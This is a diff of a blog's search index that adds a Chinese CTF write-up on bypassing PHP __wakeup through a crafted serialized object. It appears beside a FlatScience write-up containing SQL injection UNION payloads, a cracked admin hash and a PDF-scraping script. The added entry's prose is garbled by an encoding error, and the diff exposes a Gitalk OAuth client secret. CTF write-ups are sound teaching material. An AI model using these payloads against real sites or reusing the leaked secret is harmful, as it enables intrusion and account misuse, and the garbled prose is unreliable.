@@ -1,6 +1,72 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>CTF��������-WEB-php2</title>
+    <url>/2019/12/31/ctf-web-php2/</url>
+    <content><![CDATA[<div class="note info"><p>0x01 ǰҪ</p></div>
+1.PHP���л��뷴���л� </br>
+
+
+<a id="more"></a>
+
+<div class="note info"><p>0x02 ����������˼·</p></div>
+1.����ҳ��Ŀ¼������ע��Ҳûʲô�仯����������
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">class xctf&#123;</span><br><span class="line">public <span class="variable">$flag</span> = <span class="string">'111'</span>;</span><br><span class="line">public <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()&#123;</span><br><span class="line"><span class="built_in">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure></div>
+
+<p>2.����������ν����ѧ���������������ĺ�����������<br> 2_1.�������ǵĹ�ע�� _wakeup(),һ���Ȼ����㶫������ϸ��˵�����Կ��Ҹ��Ĳο����������÷����л��ƹ�wakeup���flag��</p>
+ </br>
+3.��Դ������мӹ�
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class xctf&#123;</span><br><span class="line">public <span class="variable">$flag</span> = <span class="string">'111'</span>;</span><br><span class="line">public <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()&#123;</span><br><span class="line"><span class="built_in">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = new xctf();</span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="variable">$c</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$a</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>
+
+</br>
+ 3_1.��дphp�ļ����´�,�ó����
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">O:4:<span class="string">"xctf"</span>:1:&#123;s:4:<span class="string">"flag"</span>;s:3:<span class="string">"111"</span>;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>4.�õ����У�����wakeup�ƹ�ԭ���������д��ʹ����������ʵ���Բ�����Ȼ�����depoly�õ�flag��</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">O:4:<span class="string">"xctf"</span>:2:&#123;s:4:<span class="string">"flag"</span>;s:3:<span class="string">"111"</span>;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>====&gt;���¹���</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">?code=O:4:<span class="string">"xctf"</span>:2:&#123;s:4:<span class="string">"flag"</span>;s:3:<span class="string">"111"</span>;&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+<br>
+<div class="note info"><p>0x03 �ο�</p></div>
+1.<a href='https://www.php.net/manual/zh/language.oop5.serialization.php' target="_blank">���л����� - �ڻỰ�д�Ŷ���:https://www.php.net/manual/zh/language.oop5.serialization.php</a><br>
+
+
+
+
+
+
+
+<br>
+<br>
+
+<!-- Link Gitalk ��֧���ļ�  -->
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script> 
+<div id="gitalk-container"></div>     <script type="text/javascript">
+    var gitalk = new Gitalk({
+
+<pre><code>// gitalk����Ҫ����
+    clientID: &apos;dcf239aa6b46fcf244a3&apos;,
+    clientSecret: &apos;2b92cc0f958358e2c10b5fb8746381c15f5ee29d&apos;,
+    repo: &apos;MR-eggegg.github.io&apos;,
+    owner: &apos;MR-eggegg&apos;,
+    admin: [&apos;MR-eggegg&apos;],
+    id: &apos;ҳ���Ψһ��ʶ��gitalk����������ʶ�Զ�������issue�ı�ǩ&apos;,
+
+});
+gitalk.render(&apos;gitalk-container&apos;);</code></pre><p></script></p>
+]]></content>
+      <categories>
+        <category>CTF-WEB</category>
+      </categories>
+      <tags>
+        <tag>PHP���л��뷴���л���ħ������</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CTF攻防世界-WEB-FlatScience</title>
     <url>/2019/12/30/ctf-web-FlatScience/</url>
     <content><![CDATA[<div class="note info"><p>0x01 前要</p></div>
@@ -41,7 +107,7 @@
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">查询用户的SQL：usr=%27 UNION SELECT id, name from Users --+&amp;pw=</span><br><span class="line">查询密码的SQL：usr=%27 UNION SELECT id, password from Users--+&amp;pw=</span><br><span class="line">查询隐藏内容的SQL：usr=%27 UNION SELECT id, hint from Users--+&amp;pw=</span><br></pre></td></tr></table></figure></div>
 <p> 7_1.分别得出：</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">id:admin</span><br><span class="line">password:3fab54a50e770d830c0416df817567662a9dc85c</span><br><span class="line">hint:my+fav+word+<span class="keyword">in</span>+my+fav+paper%3F%2</span><br></pre></td></tr></table></figure></div>
-<p>8.其实到这里，因为之前已经知道密码存在sha1加密，我们直接拿着密码去 MD5解密得到解密后的密码就可以直接去网站上登陆获得flag。不知道是不是当初设计上的漏送，导致这题只有1星，实际上从答题人数和麻烦程度来说远不止1星。<br><img src="3.PNG" alt=""><br><br><br>9.闲着无聊，并不想那么轻易的答题，尝试出题人的正常解题方式答题。<br> 9_1.我们在最开始进入网页的时候，可以看到非常多的PDF文件，根据第7步骤的hint隐藏线索的显示，出提人是想让我们从大量的PDF中找出密码。<br> 9_2.虽然是web渗透方向的题目，我们确实也可以一个一个点下载获得PDF，不过作为一个猿，我在网上找了很多爬取PDF的python代码，因为2020年1月开始，py2的代码不再被py3向下兼容，我就把代码改装成py3的代码，并加上了多网页爬取PDF。<br><img src="4.PNG" alt=""></p>
+<p>8.其实到这里，因为之前已经知道密码存在sha1加密，我们直接拿着密码去 MD5解密得到解密后的密码就可以直接去admin.php登陆获得flag。不知道是不是当初设计上的漏送，导致这题只有1星，实际上从答题人数和麻烦程度来说远不止1星。<br><img src="3.PNG" alt=""><br><br><br>9.闲着无聊，并不想那么轻易的答题，尝试出题人的正常解题方式答题。<br> 9_1.我们在最开始进入网页的时候，可以看到非常多的PDF文件，根据第7步骤的hint隐藏线索的显示，出提人是想让我们从大量的PDF中找出密码。<br> 9_2.虽然是web渗透方向的题目，我们确实也可以一个一个点下载获得PDF，不过作为一个猿，我在网上找了很多爬取PDF的python代码，因为2020年1月开始，py2的代码不再被py3向下兼容，我就把代码改装成py3的代码，并加上了多网页爬取PDF。<br><img src="4.PNG" alt=""></p>
 <details>
 <summary>python3爬取多目标网页PDF文件并下载到指定目录     展开/折叠</summary>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line">import re</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># open the url and read</span><br><span class="line">def getHtml(url):</span><br><span class="line">    page &#x3D; urllib.request.urlopen(url)</span><br><span class="line">    html &#x3D; page.read()</span><br><span class="line">    page.close()</span><br><span class="line">    return html</span><br><span class="line"></span><br><span class="line">def getUrl(html):</span><br><span class="line">    reg &#x3D; r&#39;(?:href|HREF)&#x3D;&quot;?((?:http:&#x2F;&#x2F;)?.+?\.pdf)&#39;</span><br><span class="line">    url_re &#x3D; re.compile(reg)</span><br><span class="line">    url_lst &#x3D; url_re.findall(html.decode(&#39;utf-8&#39;))</span><br><span class="line">    return(url_lst)</span><br><span class="line"></span><br><span class="line">def getFile(url):</span><br><span class="line">    file_name &#x3D; url.split(&#39;&#x2F;&#39;)[-1]</span><br><span class="line">    u &#x3D; urllib.request.urlopen(url)</span><br><span class="line">    f &#x3D; open(file_name, &#39;wb&#39;)</span><br><span class="line"></span><br><span class="line">    block_sz &#x3D; 8192</span><br><span class="line">    while True:</span><br><span class="line">        buffer &#x3D; u.read(block_sz)</span><br><span class="line">        if not buffer:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">        f.write(buffer)</span><br><span class="line">    f.close()</span><br><span class="line">    print (&quot;Sucessful to download&quot; + &quot; &quot; + file_name)</span><br><span class="line"></span><br><span class="line">#指定网页</span><br><span class="line">root_url &#x3D; [&#39;http:&#x2F;&#x2F;111.198.29.45:54344&#x2F;1&#x2F;2&#x2F;5&#x2F;&#39;,</span><br><span class="line">            &#39;http:&#x2F;&#x2F;111.198.29.45:54344&#x2F;&#39;]</span><br><span class="line"></span><br><span class="line">raw_url &#x3D; [&#39;http:&#x2F;&#x2F;111.198.29.45:54344&#x2F;1&#x2F;2&#x2F;5&#x2F;index.html&#39;,</span><br><span class="line">            &#39;http:&#x2F;&#x2F;111.198.29.45:54344&#x2F;index.html&#39;</span><br><span class="line">           ]</span><br><span class="line">#指定目录</span><br><span class="line">os.mkdir(&#39;ldf_download&#39;)</span><br><span class="line">os.chdir(os.path.join(os.getcwd(), &#39;ldf_download&#39;))</span><br><span class="line">for i in range(len(root_url)):</span><br><span class="line">    print(&quot;当前网页：&quot;,root_url[i])</span><br><span class="line">    html &#x3D; getHtml(raw_url[i])</span><br><span class="line">    url_lst &#x3D; getUrl(html)</span><br><span class="line"></span><br><span class="line">    for url in url_lst[:]:</span><br><span class="line">        url &#x3D; root_url[i] + url</span><br><span class="line">        getFile(url)</span><br></pre></td></tr></table></figure></div>
